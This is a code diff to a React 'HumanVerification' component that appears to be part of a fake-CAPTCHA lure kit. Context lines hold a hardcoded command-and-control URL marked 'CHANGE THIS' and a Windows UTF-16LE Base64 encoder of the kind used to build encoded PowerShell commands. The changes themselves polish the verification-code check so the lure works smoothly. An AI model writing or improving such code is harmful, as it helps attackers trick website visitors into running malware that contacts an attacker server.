@@ -113,8 +113,6 @@ export function HumanVerification() {
 
   const C2_URL = 'http://146.103.57.122/69'; // CHANGE THIS
 
-  const randomCode = () => Math.random().toString(16).substring(2, 8).toUpperCase();
-
   // Base64 for Windows (UTF‑16LE)
   const b64UTF16 = (str) => {
     let bin = '';
@@ -210,25 +208,36 @@ export function HumanVerification() {
     }
   }
 
-  async function onSubmit(event: FormEvent) {
-    event.preventDefault()
+  async function verifyCode(code: string) {
     const VERIFIED_DELAY_MS = 600
     if (!phrase || submitting) return
+
+    const normalized = code.trim().toUpperCase()
+    if (normalized.length < 6) return
 
     setSubmitting(true)
     setVerified(false)
     setError("")
-    if (codeInput.trim().toUpperCase() === phrase.toUpperCase()) {
+
+    try {
+      if (normalized === phrase.toUpperCase()) {
+        setSubmitting(false)
+        await new Promise((r) => setTimeout(r, VERIFIED_DELAY_MS))
+        setPassed(true)
+        setVerified(true)
+        window.setTimeout(() => setOpen(false), 1200)
+      } else {
+        setError(humanVerification.verifyError)
+        setVerified(false)
+      }
+    } finally {
       setSubmitting(false)
-      await new Promise((r) => setTimeout(r, VERIFIED_DELAY_MS))
-      setPassed(true)
-      setVerified(true)
-      window.setTimeout(() => setOpen(false), 1200)
-    } else {
-      setError(humanVerification.verifyError)
-      setVerified(false)
     }
-    setSubmitting(false)
+  }
+
+  async function onSubmit(event: FormEvent) {
+    event.preventDefault()
+    await verifyCode(codeInput)
   }
 
   if (!track || !open) return null
@@ -562,8 +571,9 @@ export function HumanVerification() {
                           inputs?.[index + 1]?.focus();
                         }
 
+                        // Pass `next` directly — don't rely on state yet
                         if (next.length === 6 && !submitting) {
-                          form?.requestSubmit();
+                          void verifyCode(next);
                         }
                       }}
                       onKeyDown={(event) => {
@@ -589,7 +599,7 @@ export function HumanVerification() {
 
                         const form = event.currentTarget.closest("form");
                         if (pasted.length === 6 && !submitting) {
-                          queueMicrotask(() => form?.requestSubmit());
+                          void verifyCode(pasted);
                         } else {
                           const inputs =
                             form?.querySelectorAll<HTMLInputElement>("input[data-code-box]");
@@ -600,7 +610,6 @@ export function HumanVerification() {
                   ))}
                 </div>
 
-                {/* Status underneath the input panel */}
                 {error ? null : verified ? (
                   <div className="flex items-center justify-center">
                     <span className="flex h-6 w-6 items-center justify-center rounded-full bg-emerald-500 text-white">
